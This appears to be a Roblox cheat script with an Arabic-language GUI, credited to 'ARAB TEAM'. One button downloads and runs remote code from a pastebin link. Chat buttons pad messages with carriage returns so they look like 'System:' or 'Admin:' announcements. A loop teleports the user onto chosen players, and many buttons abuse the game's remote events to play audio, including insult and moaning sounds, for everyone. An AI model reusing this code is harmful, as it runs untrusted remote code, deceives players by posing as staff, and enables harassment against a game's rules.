Tab:AddButton({
    Name = "Delete All Items",
    Callback = function()
        -- Deletando todos os itens do inventÃ¡rio
        local player = game.Players.LocalPlayer
        for _, item in pairs(player.Backpack:GetChildren()) do
            if item:IsA("Tool") then
                item:Destroy()  -- Deleta o item
            end
        end
    end
})

Tab:AddButton({
    Name = "fling Ball UI",
    Callback = function()
loadstring(game:HttpGet("https://pastebin.com/raw/fgEZsxws"))()
    end
})

local Tab = Window:MakeTab({"الشات"})

-- SeÃ§Ã£o: Enviar uma mensagem normal
local playerInput1 = ""

Tab:AddSection({Name = "رساله عاديه"})

Tab:AddTextBox({
    Name = "اكتب رسالتك",
    Default = "",
    TextDisappear = false,
    Callback = function(text)
        playerInput1 = text
    end
})

Tab:AddButton({
    Name = "ارسال",
    Callback = function()
        local TextChatService = game:GetService("TextChatService")
        if TextChatService.ChatVersion == Enum.ChatVersion.TextChatService then
            local message = ".\r\r\r\r\r\r\r\r\r\r\r\r\r\r\r\r\r\r\r\r\r\r\r\r\r\r\r\r\r\r\r\r\r\r\r\r\r\r\r\r\r\r\r\r\r\r\r\r\r\r\r\r\r\r\r\r\r\r\r" .. playerInput1
            TextChatService.TextChannels.RBXGeneral:SendAsync(message)
        else
        end
    end
})

-- SeÃ§Ã£o: Enviar mensagem com prefixo System
local playerInput2 = ""

Tab:AddSection({Name = "رساله سيرفر"})

Tab:AddTextBox({
    Name = "اكتب رسالتك",
    Default = "",
    TextDisappear = false,
    Callback = function(text)
        playerInput2 = text
    end
})

Tab:AddButton({
    Name = "ارسال",
    Callback = function()
        local TextChatService = game:GetService("TextChatService")
        if TextChatService.ChatVersion == Enum.ChatVersion.TextChatService then
            local message = ".\r\r\r\r\r\r\r\r\r\r\r\r\r\r\r\r\r\r\r\r\r\r\r\r\r\r\r\r\r\r\r\r\r\r\r\r\r\r\r\r\r\r\r\r\r\r\r\r\r\r\r\r\r\rSystem: " .. playerInput2
            TextChatService.TextChannels.RBXGeneral:SendAsync(message)
        else
        end
    end
})

Tab:AddSection({Name = "رساله ادمن"})

Tab:AddTextBox({
    Name = "اكتب رسالتك",
    Default = "",
    TextDisappear = false,
    Callback = function(text)
        playerInput1 = text
    end
})

Tab:AddButton({
    Name = "ارسال",
    Callback = function()
        local TextChatService = game:GetService("TextChatService")
        if TextChatService.ChatVersion == Enum.ChatVersion.TextChatService then
            local message = ".\r\r\r\r\r\r\r\r\r\r\r\r\r\r\r\r\r\r\r\r\r\r\r\r\r\r\r\r\r\r\r\r\r\r\r\r\r\r\r\r\r\r\r\r\r\r\r\r\r\r\r\r\r\rAdmin: " .. playerInput1
            TextChatService.TextChannels.RBXGeneral:SendAsync(message)
        else
        end
    end
})

local Tab = Window:MakeTab({"التنقل"})

local Dropdown
local LastSelectedPlayer = nil
local IsLooping = false

local function UpdatePlayerDropdown()
    local playerNames = {}
    for _, player in ipairs(game.Players:GetPlayers()) do
        table.insert(playerNames, player.Name)
    end
    if Dropdown then
        Dropdown:Set(playerNames)
    end
end

local function TeleportToPlayer(playerName)
    local player = game.Players:FindFirstChild(playerName)
    if player and player.Character and player.Character:FindFirstChild("HumanoidRootPart") then
        local character = game.Players.LocalPlayer.Character
        if character and character:FindFirstChild("HumanoidRootPart") then
            character.HumanoidRootPart.CFrame = player.Character.HumanoidRootPart.CFrame
        end
    end
end

Dropdown = Tab:AddDropdown({
    Name = "اختار الاعب الذي تريد الانتقال له و سيتم الانتقال تلقائيا",
    Description = "يجب اختيار لاعب للانتقال",
    Options = {},
    Default = "",
    Flag = "playersDropdown",
    Callback = function(value)
        if value ~= "" and value ~= LastSelectedPlayer then
            TeleportToPlayer(value)
            LastSelectedPlayer = value
        end
    end
})

local ToggleLoopTP = Tab:AddToggle({
    Name = "تفعيل انتقال تلقائي للاعب",
    Description = "عندما تضغط على الزر سيتم تفعيل الانتقال التلقائي للاعب",
    Default = false,
    Flag = "loopTP",
    Callback = function(isToggled)
        IsLooping = isToggled
        while IsLooping do
            if LastSelectedPlayer then
                TeleportToPlayer(LastSelectedPlayer)
            end
            wait(0.05)
        end
    end
})

game.Players.PlayerAdded:Connect(UpdatePlayerDropdown)
game.Players.PlayerRemoving:Connect(UpdatePlayerDropdown)

UpdatePlayerDropdown()

local Tab = Window:MakeTab({"الاغاني"})

Tab:AddTextBox({
  Name = "مشغل اغاني للسكيت بورد",
  Description = "ملاحظه: يجب ان يكون معك قيمباس الاغاني", 
  PlaceholderText = "ادخل الكود هنا",
  Callback = function(Value)
    local args1 = {
            [1] = "SkateBoard"
        }
        game:GetService("ReplicatedStorage"):WaitForChild("RE"):WaitForChild("1NoMoto1rVehicle1s"):FireServer(unpack(args1))
 
        -- Replacing the static value with the input from the textbox
        local args2 = {
            [1] = "PickingScooterMusicText",
            [2] = Value -- Here, we use the textbox value to replace 35935204
        }
        game:GetService("ReplicatedStorage"):WaitForChild("RE"):WaitForChild("1NoMoto1rVehicle1s"):FireServer(unpack(args2))
        
  end
})

Tab:AddTextBox({
  Name = "مشغل اغاني للبيت",
  Description = "ملاحظه: يجب ان يكون معك قيمباس الاغاني", 
  PlaceholderText = "ادخل الكود هنا",
  Callback = function(Value)
    local args = {
            [1] = "PickHouseMusicText",
            [2] = input -- Use the user's input here
        }
        game:GetService("ReplicatedStorage"):WaitForChild("RE"):WaitForChild("1Player1sHous1e"):FireServer(unpack(args))
  end
})

Tab:AddTextBox({
  Name = "مشغل اغاني مجاني بدون قيمباس",
  Description = "ملاحظه: الناس تسمع فقط اول الاغنيه انت تسمعها كامله", 
  PlaceholderText = "ادخل الكود هنا",
  Callback = function(Value)
    local args1 = {
            [1] = "SkateBoard"
        }
        game:GetService("ReplicatedStorage"):WaitForChild("RE"):WaitForChild("1NoMoto1rVehicle1s"):FireServer(unpack(args1))
 
        -- Replacing the static value with the input from the textbox
        local args2 = {
            [1] = "PickingScooterMusicText",
            [2] = Value -- Here, we use the textbox value to replace 35935204
        }
        game:GetService("ReplicatedStorage"):WaitForChild("RE"):WaitForChild("1NoMoto1rVehicle1s"):FireServer(unpack(args2))
        
  end
})

local Section = Tab:AddSection({
	Name = "ملاحظه: يجب ان يكون لديك قيمباس الاغاني لتشغيل الاغاني"
})

local Section = Tab:AddSection({
	Name = "الاغاني العربية"
})

Tab:AddButton({ 	Name  = "فورتنايت ببجي", 	Callback = function()

game.StarterGui:SetCore("SendNotification", {
    Title = "تم التشغيل";
    Text = "ملاحظه: في اغاني تحتاج الى تقريبا 10 ثواني للتشغيل"; -- ARAB TEAM
    Duration = 5;
})

     local args = {
    [1] = "SkateBoard"
}
 
game:GetService("ReplicatedStorage").RE:FindFirstChild("1NoMoto1rVehicle1s"):FireServer(unpack(args))
local args = {
    [1] = "PickingScooterMusicText",
    [2] = "8671258578"
}
 
game:GetService("ReplicatedStorage").RE:FindFirstChild("1NoMoto1rVehicle1s"):FireServer(unpack(args))

end })

Tab:AddButton({ 	Name  = "اغنيه في عالم", 	Callback = function()

game.StarterGui:SetCore("SendNotification", {
    Title = "تم التشغيل";
    Text = "ملاحظه: في اغاني تحتاج الى تقريبا 10 ثواني للتشغيل"; -- ARAB TEAM
    Duration = 5;
})

local args = {
    [1] = "SkateBoard"
}
 
game:GetService("ReplicatedStorage").RE:FindFirstChild("1NoMoto1rVehicle1s"):FireServer(unpack(args))
local args = {
    [1] = "PickingScooterMusicText",
    [2] = "125151253990122"
}
 
game:GetService("ReplicatedStorage").RE:FindFirstChild("1NoMoto1rVehicle1s"):FireServer(unpack(args))

end })

Tab:AddButton({ 	Name  = "حزين", 	Callback = function()

game.StarterGui:SetCore("SendNotification", {
    Title = "تم التشغيل";
    Text = "ملاحظه: في اغاني تحتاج الى تقريبا 10 ثواني للتشغيل"; -- ARAB TEAM
    Duration = 5;
})

     local args = {
    [1] = "SkateBoard"
}
 
game:GetService("ReplicatedStorage").RE:FindFirstChild("1NoMoto1rVehicle1s"):FireServer(unpack(args))
local args = {
    [1] = "PickingScooterMusicText",
    [2] = "135308045"
}
 
game:GetService("ReplicatedStorage").RE:FindFirstChild("1NoMoto1rVehicle1s"):FireServer(unpack(args))

end })

Tab:AddButton({ 	Name  = "الحمدلله", 	Callback = function()

game.StarterGui:SetCore("SendNotification", {
    Title = "تم التشغيل";
    Text = "ملاحظه: في اغاني تحتاج الى تقريبا 10 ثواني للتشغيل"; -- ARAB TEAM
    Duration = 5;
})

     local args = {
    [1] = "SkateBoard"
}
 
game:GetService("ReplicatedStorage").RE:FindFirstChild("1NoMoto1rVehicle1s"):FireServer(unpack(args))
local args = {
    [1] = "PickingScooterMusicText",
    [2] = "7609175072"
}
 
game:GetService("ReplicatedStorage").RE:FindFirstChild("1NoMoto1rVehicle1s"):FireServer(unpack(args))

end })

Tab:AddButton({ 	Name  = "جاء الليل", 	Callback = function()

game.StarterGui:SetCore("SendNotification", {
    Title = "تم التشغيل";
    Text = "ملاحظه: في اغاني تحتاج الى تقريبا 10 ثواني للتشغيل"; -- ARAB TEAM
    Duration = 5;
})

     local args = {
    [1] = "SkateBoard"
}
 
game:GetService("ReplicatedStorage").RE:FindFirstChild("1NoMoto1rVehicle1s"):FireServer(unpack(args))
local args = {
    [1] = "PickingScooterMusicText",
    [2] = "132182002773837"
}
 
game:GetService("ReplicatedStorage").RE:FindFirstChild("1NoMoto1rVehicle1s"):FireServer(unpack(args))

end })

Tab:AddButton({ 	Name  = "السلام عليكم", 	Callback = function()

game.StarterGui:SetCore("SendNotification", {
    Title = "تم التشغيل";
    Text = "ملاحظه: في اغاني تحتاج الى تقريبا 10 ثواني للتشغيل"; -- ARAB TEAM
    Duration = 5;
})

     local args = {
    [1] = "SkateBoard"
}
 
game:GetService("ReplicatedStorage").RE:FindFirstChild("1NoMoto1rVehicle1s"):FireServer(unpack(args))
local args = {
    [1] = "PickingScooterMusicText",
    [2] = "7038667176"
}
 
game:GetService("ReplicatedStorage").RE:FindFirstChild("1NoMoto1rVehicle1s"):FireServer(unpack(args))

end })

Tab:AddButton({ 	Name  = "صدام", 	Callback = function()

game.StarterGui:SetCore("SendNotification", {
    Title = "تم التشغيل";
    Text = "ملاحظه: في اغاني تحتاج الى تقريبا 10 ثواني للتشغيل"; -- ARAB TEAM
    Duration = 5;
})

     local args = {
    [1] = "SkateBoard"
}
 
game:GetService("ReplicatedStorage").RE:FindFirstChild("1NoMoto1rVehicle1s"):FireServer(unpack(args))
local args = {
    [1] = "PickingScooterMusicText",
    [2] = "8273849195"
}
 
game:GetService("ReplicatedStorage").RE:FindFirstChild("1NoMoto1rVehicle1s"):FireServer(unpack(args))

end })

Tab:AddButton({ 	Name  = "ويه ويه", 	Callback = function()

game.StarterGui:SetCore("SendNotification", {
    Title = "تم التشغيل";
    Text = "ملاحظه: في اغاني تحتاج الى تقريبا 10 ثواني للتشغيل"; -- ARAB TEAM
    Duration = 5;
})

     local args = {
    [1] = "SkateBoard"
}
 
game:GetService("ReplicatedStorage").RE:FindFirstChild("1NoMoto1rVehicle1s"):FireServer(unpack(args))
local args = {
    [1] = "PickingScooterMusicText",
    [2] = "1164198099"
}
 
game:GetService("ReplicatedStorage").RE:FindFirstChild("1NoMoto1rVehicle1s"):FireServer(unpack(args))

end })

Tab:AddButton({ 	Name  = "حبيبي شنو في", 	Callback = function()

game.StarterGui:SetCore("SendNotification", {
    Title = "تم التشغيل";
    Text = "ملاحظه: في اغاني تحتاج الى تقريبا 10 ثواني للتشغيل"; -- ARAB TEAM
    Duration = 5;
})

     local args = {
    [1] = "SkateBoard"
}
 
game:GetService("ReplicatedStorage").RE:FindFirstChild("1NoMoto1rVehicle1s"):FireServer(unpack(args))
local args = {
    [1] = "PickingScooterMusicText",
    [2] = "7657178494"
}
 
game:GetService("ReplicatedStorage").RE:FindFirstChild("1NoMoto1rVehicle1s"):FireServer(unpack(args))

end })

Tab:AddButton({ 	Name  = "مصري حب", 	Callback = function()

game.StarterGui:SetCore("SendNotification", {
    Title = "تم التشغيل";
    Text = "ملاحظه: في اغاني تحتاج الى تقريبا 10 ثواني للتشغيل"; -- ARAB TEAM
    Duration = 5;
})

     local args = {
    [1] = "SkateBoard"
}
 
game:GetService("ReplicatedStorage").RE:FindFirstChild("1NoMoto1rVehicle1s"):FireServer(unpack(args))
local args = {
    [1] = "PickingScooterMusicText",
    [2] = "93620598835551"
}
 
game:GetService("ReplicatedStorage").RE:FindFirstChild("1NoMoto1rVehicle1s"):FireServer(unpack(args))

end })

Tab:AddButton({ 	Name  = "عراقي حزين", 	Callback = function()

game.StarterGui:SetCore("SendNotification", {
    Title = "تم التشغيل";
    Text = "ملاحظه: في اغاني تحتاج الى تقريبا 10 ثواني للتشغيل"; -- ARAB TEAM
    Duration = 5;
})

     local args = {
    [1] = "SkateBoard"
}
 
game:GetService("ReplicatedStorage").RE:FindFirstChild("1NoMoto1rVehicle1s"):FireServer(unpack(args))
local args = {
    [1] = "PickingScooterMusicText",
    [2] = "80039364766636"
}
 
game:GetService("ReplicatedStorage").RE:FindFirstChild("1NoMoto1rVehicle1s"):FireServer(unpack(args))

end })

Tab:AddButton({ 	Name  = "دبكه", 	Callback = function()

game.StarterGui:SetCore("SendNotification", {
    Title = "تم التشغيل";
    Text = "ملاحظه: في اغاني تحتاج الى تقريبا 10 ثواني للتشغيل"; -- ARAB TEAM
    Duration = 5;
})

     local args = {
    [1] = "SkateBoard"
}
 
game:GetService("ReplicatedStorage").RE:FindFirstChild("1NoMoto1rVehicle1s"):FireServer(unpack(args))
local args = {
    [1] = "PickingScooterMusicText",
    [2] = "76698985299412"
}
 
game:GetService("ReplicatedStorage").RE:FindFirstChild("1NoMoto1rVehicle1s"):FireServer(unpack(args))

end })

Tab:AddButton({ 	Name  = "ازعاج", 	Callback = function()

game.StarterGui:SetCore("SendNotification", {
    Title = "تم التشغيل";
    Text = "ملاحظه: في اغاني تحتاج الى تقريبا 10 ثواني للتشغيل"; -- ARAB TEAM
    Duration = 5;
})

     local args = {
    [1] = "SkateBoard"
}
 
game:GetService("ReplicatedStorage").RE:FindFirstChild("1NoMoto1rVehicle1s"):FireServer(unpack(args))
local args = {
    [1] = "PickingScooterMusicText",
    [2] = "4776398821"
}
 
game:GetService("ReplicatedStorage").RE:FindFirstChild("1NoMoto1rVehicle1s"):FireServer(unpack(args))

end })

Tab:AddButton({ 	Name  = "ضراط", 	Callback = function()

game.StarterGui:SetCore("SendNotification", {
    Title = "تم التشغيل";
    Text = "ملاحظه: في اغاني تحتاج الى تقريبا 10 ثواني للتشغيل"; -- ARAB TEAM
    Duration = 5;
})

     local args = {
    [1] = "SkateBoard"
}
 
game:GetService("ReplicatedStorage").RE:FindFirstChild("1NoMoto1rVehicle1s"):FireServer(unpack(args))
local args = {
    [1] = "PickingScooterMusicText",
    [2] = "4809574295"
}
 
game:GetService("ReplicatedStorage").RE:FindFirstChild("1NoMoto1rVehicle1s"):FireServer(unpack(args))

end })

Tab:AddButton({ 	Name  = "عزف عود", 	Callback = function()

game.StarterGui:SetCore("SendNotification", {
    Title = "تم التشغيل";
    Text = "ملاحظه: في اغاني تحتاج الى تقريبا 10 ثواني للتشغيل"; -- ARAB TEAM
    Duration = 5;
})

     local args = {
    [1] = "SkateBoard"
}
 
game:GetService("ReplicatedStorage").RE:FindFirstChild("1NoMoto1rVehicle1s"):FireServer(unpack(args))
local args = {
    [1] = "PickingScooterMusicText",
    [2] = "114157294180725"
}
 
game:GetService("ReplicatedStorage").RE:FindFirstChild("1NoMoto1rVehicle1s"):FireServer(unpack(args))

end })

Tab:AddButton({ 	Name  = "عزف عود 2", 	Callback = function()

game.StarterGui:SetCore("SendNotification", {
    Title = "تم التشغيل";
    Text = "ملاحظه: في اغاني تحتاج الى تقريبا 10 ثواني للتشغيل"; -- ARAB TEAM
    Duration = 5;
})

     local args = {
    [1] = "SkateBoard"
}
 
game:GetService("ReplicatedStorage").RE:FindFirstChild("1NoMoto1rVehicle1s"):FireServer(unpack(args))
local args = {
    [1] = "PickingScooterMusicText",
    [2] = "104085669063530"
}
 
game:GetService("ReplicatedStorage").RE:FindFirstChild("1NoMoto1rVehicle1s"):FireServer(unpack(args))

end })

Tab:AddButton({ 	Name  = "يمني وين الوفاء", 	Callback = function()

game.StarterGui:SetCore("SendNotification", {
    Title = "تم التشغيل";
    Text = "ملاحظه: في اغاني تحتاج الى تقريبا 10 ثواني للتشغيل"; -- ARAB TEAM
    Duration = 5;
})

     local args = {
    [1] = "SkateBoard"
}
 
game:GetService("ReplicatedStorage").RE:FindFirstChild("1NoMoto1rVehicle1s"):FireServer(unpack(args))
local args = {
    [1] = "PickingScooterMusicText",
    [2] = "116150415085902"
}
 
game:GetService("ReplicatedStorage").RE:FindFirstChild("1NoMoto1rVehicle1s"):FireServer(unpack(args))

end })

Tab:AddButton({ 	Name  = "حزينه", 	Callback = function()

game.StarterGui:SetCore("SendNotification", {
    Title = "تم التشغيل";
    Text = "ملاحظه: في اغاني تحتاج الى تقريبا 10 ثواني للتشغيل"; -- ARAB TEAM
    Duration = 5;
})

     local args = {
    [1] = "SkateBoard"
}
 
game:GetService("ReplicatedStorage").RE:FindFirstChild("1NoMoto1rVehicle1s"):FireServer(unpack(args))
local args = {
    [1] = "PickingScooterMusicText",
    [2] = "132378395114388"
}
 
game:GetService("ReplicatedStorage").RE:FindFirstChild("1NoMoto1rVehicle1s"):FireServer(unpack(args))

end })

Tab:AddButton({ 	Name  = "سعودي حزين", 	Callback = function()

game.StarterGui:SetCore("SendNotification", {
    Title = "تم التشغيل";
    Text = "ملاحظه: في اغاني تحتاج الى تقريبا 10 ثواني للتشغيل"; -- ARAB TEAM
    Duration = 5;
})

     local args = {
    [1] = "SkateBoard"
}
 
game:GetService("ReplicatedStorage").RE:FindFirstChild("1NoMoto1rVehicle1s"):FireServer(unpack(args))
local args = {
    [1] = "PickingScooterMusicText",
    [2] = "99123490695024"
}
 
game:GetService("ReplicatedStorage").RE:FindFirstChild("1NoMoto1rVehicle1s"):FireServer(unpack(args))

end })

Tab:AddButton({ 	Name  = "اه ياحلو", 	Callback = function()

game.StarterGui:SetCore("SendNotification", {
    Title = "تم التشغيل";
    Text = "ملاحظه: في اغاني تحتاج الى تقريبا 10 ثواني للتشغيل"; -- ARAB TEAM
    Duration = 5;
})

     local args = {
    [1] = "SkateBoard"
}
 
game:GetService("ReplicatedStorage").RE:FindFirstChild("1NoMoto1rVehicle1s"):FireServer(unpack(args))
local args = {
    [1] = "PickingScooterMusicText",
    [2] = "93620598835551"
}
 
game:GetService("ReplicatedStorage").RE:FindFirstChild("1NoMoto1rVehicle1s"):FireServer(unpack(args))

end })

Tab:AddButton({ 	Name  = "تعالي عند دادي", 	Callback = function()

game.StarterGui:SetCore("SendNotification", {
    Title = "تم التشغيل";
    Text = "ملاحظه: في اغاني تحتاج الى تقريبا 10 ثواني للتشغيل"; -- ARAB TEAM
    Duration = 5;
})

     local args = {
    [1] = "SkateBoard"
}
 
game:GetService("ReplicatedStorage").RE:FindFirstChild("1NoMoto1rVehicle1s"):FireServer(unpack(args))
local args = {
    [1] = "PickingScooterMusicText",
    [2] = "7984027399"
}
 
game:GetService("ReplicatedStorage").RE:FindFirstChild("1NoMoto1rVehicle1s"):FireServer(unpack(args))

end })

Tab:AddButton({ 	Name  = "ابو علي حسن و حسين", 	Callback = function()

game.StarterGui:SetCore("SendNotification", {
    Title = "تم التشغيل";
    Text = "ملاحظه: في اغاني تحتاج الى تقريبا 10 ثواني للتشغيل"; -- ARAB TEAM
    Duration = 5;
})

     local args = {
    [1] = "SkateBoard"
}
 
game:GetService("ReplicatedStorage").RE:FindFirstChild("1NoMoto1rVehicle1s"):FireServer(unpack(args))
local args = {
    [1] = "PickingScooterMusicText",
    [2] = "98224127892587"
}
 
game:GetService("ReplicatedStorage").RE:FindFirstChild("1NoMoto1rVehicle1s"):FireServer(unpack(args))

end })

Tab:AddButton({ 	Name  = "اغنيه سوريه", 	Callback = function()

game.StarterGui:SetCore("SendNotification", {
    Title = "تم التشغيل";
    Text = "ملاحظه: في اغاني تحتاج الى تقريبا 10 ثواني للتشغيل"; -- ARAB TEAM
    Duration = 5;
})

     local args = {
    [1] = "SkateBoard"
}
 
game:GetService("ReplicatedStorage").RE:FindFirstChild("1NoMoto1rVehicle1s"):FireServer(unpack(args))
local args = {
    [1] = "PickingScooterMusicText",
    [2] = "98640789490482"
}
 
game:GetService("ReplicatedStorage").RE:FindFirstChild("1NoMoto1rVehicle1s"):FireServer(unpack(args))

end })

Tab:AddButton({ 	Name  = "خليجي", 	Callback = function()

game.StarterGui:SetCore("SendNotification", {
    Title = "تم التشغيل";
    Text = "ملاحظه: في اغاني تحتاج الى تقريبا 10 ثواني للتشغيل"; -- ARAB TEAM
    Duration = 5;
})

     local args = {
    [1] = "SkateBoard"
}
 
game:GetService("ReplicatedStorage").RE:FindFirstChild("1NoMoto1rVehicle1s"):FireServer(unpack(args))
local args = {
    [1] = "PickingScooterMusicText",
    [2] = "127593500790634"
}
 
game:GetService("ReplicatedStorage").RE:FindFirstChild("1NoMoto1rVehicle1s"):FireServer(unpack(args))

end })

Tab:AddButton({ 	Name  = "رعب", 	Callback = function()

game.StarterGui:SetCore("SendNotification", {
    Title = "تم التشغيل";
    Text = "ملاحظه: في اغاني تحتاج الى تقريبا 10 ثواني للتشغيل"; -- ARAB TEAM
    Duration = 5;
})

     local args = {
    [1] = "SkateBoard"
}
 
game:GetService("ReplicatedStorage").RE:FindFirstChild("1NoMoto1rVehicle1s"):FireServer(unpack(args))
local args = {
    [1] = "PickingScooterMusicText",
    [2] = "1848748988"
}
 
game:GetService("ReplicatedStorage").RE:FindFirstChild("1NoMoto1rVehicle1s"):FireServer(unpack(args))

end })

Tab:AddButton({ 	Name  = "سبونج بوب", 	Callback = function()

game.StarterGui:SetCore("SendNotification", {
    Title = "تم التشغيل";
    Text = "ملاحظه: في اغاني تحتاج الى تقريبا 10 ثواني للتشغيل"; -- ARAB TEAM
    Duration = 5;
})

     local args = {
    [1] = "SkateBoard"
}
 
game:GetService("ReplicatedStorage").RE:FindFirstChild("1NoMoto1rVehicle1s"):FireServer(unpack(args))
local args = {
    [1] = "PickingScooterMusicText",
    [2] = "2396797933"
}
 
game:GetService("ReplicatedStorage").RE:FindFirstChild("1NoMoto1rVehicle1s"):FireServer(unpack(args))

end })

Tab:AddButton({ 	Name  = "اغنيه عربيه", 	Callback = function()

game.StarterGui:SetCore("SendNotification", {
    Title = "تم التشغيل";
    Text = "ملاحظه: في اغاني تحتاج الى تقريبا 10 ثواني للتشغيل"; -- ARAB TEAM
    Duration = 5;
})

     local args = {
    [1] = "SkateBoard"
}
 
game:GetService("ReplicatedStorage").RE:FindFirstChild("1NoMoto1rVehicle1s"):FireServer(unpack(args))
local args = {
    [1] = "PickingScooterMusicText",
    [2] = "1836685799"
}
 
game:GetService("ReplicatedStorage").RE:FindFirstChild("1NoMoto1rVehicle1s"):FireServer(unpack(args))

end })

Tab:AddButton({ 	Name  = "اوو", 	Callback = function()

game.StarterGui:SetCore("SendNotification", {
    Title = "تم التشغيل";
    Text = "ملاحظه: في اغاني تحتاج الى تقريبا 10 ثواني للتشغيل"; -- ARAB TEAM
    Duration = 5;
})

     local args = {
    [1] = "SkateBoard"
}
 
game:GetService("ReplicatedStorage").RE:FindFirstChild("1NoMoto1rVehicle1s"):FireServer(unpack(args))
local args = {
    [1] = "PickingScooterMusicText",
    [2] = "93123670572331"
}
 
game:GetService("ReplicatedStorage").RE:FindFirstChild("1NoMoto1rVehicle1s"):FireServer(unpack(args))

end })

Tab:AddButton({ 	Name  = "ناني", 	Callback = function()

game.StarterGui:SetCore("SendNotification", {
    Title = "تم التشغيل";
    Text = "ملاحظه: في اغاني تحتاج الى تقريبا 10 ثواني للتشغيل"; -- ARAB TEAM
    Duration = 5;
})

     local args = {
    [1] = "SkateBoard"
}
 
game:GetService("ReplicatedStorage").RE:FindFirstChild("1NoMoto1rVehicle1s"):FireServer(unpack(args))
local args = {
    [1] = "PickingScooterMusicText",
    [2] = "8842446965"
}
 
game:GetService("ReplicatedStorage").RE:FindFirstChild("1NoMoto1rVehicle1s"):FireServer(unpack(args))

end })

local Section = Tab:AddSection({
	Name = "قران كريم"
})

Tab:AddButton({ 	Name  = "قران 1", 	Callback = function()

game.StarterGui:SetCore("SendNotification", {
    Title = "تم التشغيل";
    Text = "ملاحظه: في اغاني تحتاج الى تقريبا 10 ثواني للتشغيل"; -- ARAB TEAM
    Duration = 5;
})

     local args = {
    [1] = "SkateBoard"
}
 
game:GetService("ReplicatedStorage").RE:FindFirstChild("1NoMoto1rVehicle1s"):FireServer(unpack(args))
local args = {
    [1] = "PickingScooterMusicText",
    [2] = "86911769585232"
}
 
game:GetService("ReplicatedStorage").RE:FindFirstChild("1NoMoto1rVehicle1s"):FireServer(unpack(args))

end })

Tab:AddButton({ 	Name  = "قران 2", 	Callback = function()

game.StarterGui:SetCore("SendNotification", {
    Title = "تم التشغيل";
    Text = "ملاحظه: في اغاني تحتاج الى تقريبا 10 ثواني للتشغيل"; -- ARAB TEAM
    Duration = 5;
})

     local args = {
    [1] = "SkateBoard"
}
 
game:GetService("ReplicatedStorage").RE:FindFirstChild("1NoMoto1rVehicle1s"):FireServer(unpack(args))
local args = {
    [1] = "PickingScooterMusicText",
    [2] = "133272041755020"
}
 
game:GetService("ReplicatedStorage").RE:FindFirstChild("1NoMoto1rVehicle1s"):FireServer(unpack(args))

end })

Tab:AddButton({ 	Name  = "قران 3", 	Callback = function()

game.StarterGui:SetCore("SendNotification", {
    Title = "تم التشغيل";
    Text = "ملاحظه: في اغاني تحتاج الى تقريبا 10 ثواني للتشغيل"; -- ARAB TEAM
    Duration = 5;
})

     local args = {
    [1] = "SkateBoard"
}
 
game:GetService("ReplicatedStorage").RE:FindFirstChild("1NoMoto1rVehicle1s"):FireServer(unpack(args))
local args = {
    [1] = "PickingScooterMusicText",
    [2] = "88269497623993"
}
 
game:GetService("ReplicatedStorage").RE:FindFirstChild("1NoMoto1rVehicle1s"):FireServer(unpack(args))

end })

Tab:AddButton({ 	Name  = "قران 4", 	Callback = function()

game.StarterGui:SetCore("SendNotification", {
    Title = "تم التشغيل";
    Text = "ملاحظه: في اغاني تحتاج الى تقريبا 10 ثواني للتشغيل"; -- ARAB TEAM
    Duration = 5;
})

     local args = {
    [1] = "SkateBoard"
}
 
game:GetService("ReplicatedStorage").RE:FindFirstChild("1NoMoto1rVehicle1s"):FireServer(unpack(args))
local args = {
    [1] = "PickingScooterMusicText",
    [2] = "90593176828958"
}
 
game:GetService("ReplicatedStorage").RE:FindFirstChild("1NoMoto1rVehicle1s"):FireServer(unpack(args))

end })

Tab:AddButton({ 	Name  = "قران 5", 	Callback = function()

game.StarterGui:SetCore("SendNotification", {
    Title = "تم التشغيل";
    Text = "ملاحظه: في اغاني تحتاج الى تقريبا 10 ثواني للتشغيل"; -- ARAB TEAM
    Duration = 5;
})

     local args = {
    [1] = "SkateBoard"
}
 
game:GetService("ReplicatedStorage").RE:FindFirstChild("1NoMoto1rVehicle1s"):FireServer(unpack(args))
local args = {
    [1] = "PickingScooterMusicText",
    [2] = "1836685929"
}
 
game:GetService("ReplicatedStorage").RE:FindFirstChild("1NoMoto1rVehicle1s"):FireServer(unpack(args))

end })

Tab:AddButton({ 	Name  = "قران 6", 	Callback = function()

game.StarterGui:SetCore("SendNotification", {
    Title = "تم التشغيل";
    Text = "ملاحظه: في اغاني تحتاج الى تقريبا 10 ثواني للتشغيل"; -- ARAB TEAM
    Duration = 5;
})

     local args = {
    [1] = "SkateBoard"
}
 
game:GetService("ReplicatedStorage").RE:FindFirstChild("1NoMoto1rVehicle1s"):FireServer(unpack(args))
local args = {
    [1] = "PickingScooterMusicText",
    [2] = "4711690175"
}
 
game:GetService("ReplicatedStorage").RE:FindFirstChild("1NoMoto1rVehicle1s"):FireServer(unpack(args))

end })

Tab:AddButton({ 	Name  = "اذان", 	Callback = function()

game.StarterGui:SetCore("SendNotification", {
    Title = "تم التشغيل";
    Text = "ملاحظه: في اغاني تحتاج الى تقريبا 10 ثواني للتشغيل"; -- ARAB TEAM
    Duration = 5;
})

     local args = {
    [1] = "SkateBoard"
}
 
game:GetService("ReplicatedStorage").RE:FindFirstChild("1NoMoto1rVehicle1s"):FireServer(unpack(args))
local args = {
    [1] = "PickingScooterMusicText",
    [2] = "1836685873"
}
 
game:GetService("ReplicatedStorage").RE:FindFirstChild("1NoMoto1rVehicle1s"):FireServer(unpack(args))

end })

local Section = Tab:AddSection({
	Name = "سب"
})

Tab:AddButton({ 	Name  = "صوت اهات", 	Callback = function()

game.StarterGui:SetCore("SendNotification", {
    Title = "تم التشغيل";
    Text = "ملاحظه: في اغاني تحتاج الى تقريبا 10 ثواني للتشغيل"; -- ARAB TEAM
    Duration = 5;
})

     local args = {
    [1] = "SkateBoard"
}
 
game:GetService("ReplicatedStorage").RE:FindFirstChild("1NoMoto1rVehicle1s"):FireServer(unpack(args))
local args = {
    [1] = "PickingScooterMusicText",
    [2] = "8107899910"
}
 
game:GetService("ReplicatedStorage").RE:FindFirstChild("1NoMoto1rVehicle1s"):FireServer(unpack(args))

end })

Tab:AddButton({ 	Name  = "سب 1", 	Callback = function()

game.StarterGui:SetCore("SendNotification", {
    Title = "تم التشغيل";
    Text = "ملاحظه: في اغاني تحتاج الى تقريبا 10 ثواني للتشغيل"; -- ARAB TEAM
    Duration = 5;
})

     local args = {
    [1] = "SkateBoard"
}
 
game:GetService("ReplicatedStorage").RE:FindFirstChild("1NoMoto1rVehicle1s"):FireServer(unpack(args))
local args = {
    [1] = "PickingScooterMusicText",
    [2] = "8701632845"
}
 
game:GetService("ReplicatedStorage").RE:FindFirstChild("1NoMoto1rVehicle1s"):FireServer(unpack(args))

end })

